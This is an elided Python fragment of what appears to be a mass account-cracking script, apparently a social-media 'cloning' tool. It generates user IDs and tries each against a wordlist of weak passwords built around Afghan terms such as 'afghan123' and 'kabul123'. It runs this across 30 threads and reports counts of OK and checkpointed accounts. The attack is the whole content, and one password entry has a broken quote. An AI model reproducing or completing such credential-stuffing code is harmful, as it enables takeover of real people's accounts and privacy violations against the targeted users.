...
def fuck():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in user:
            uid = code+guru
            pwx = [guru,uid,uid[:7],uid[:6],'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','۱۰۰۲۰۰,''kabul123']
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[BAD BOY]├Ч[%s/%s]├Ч[OK-%s]├Ч[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
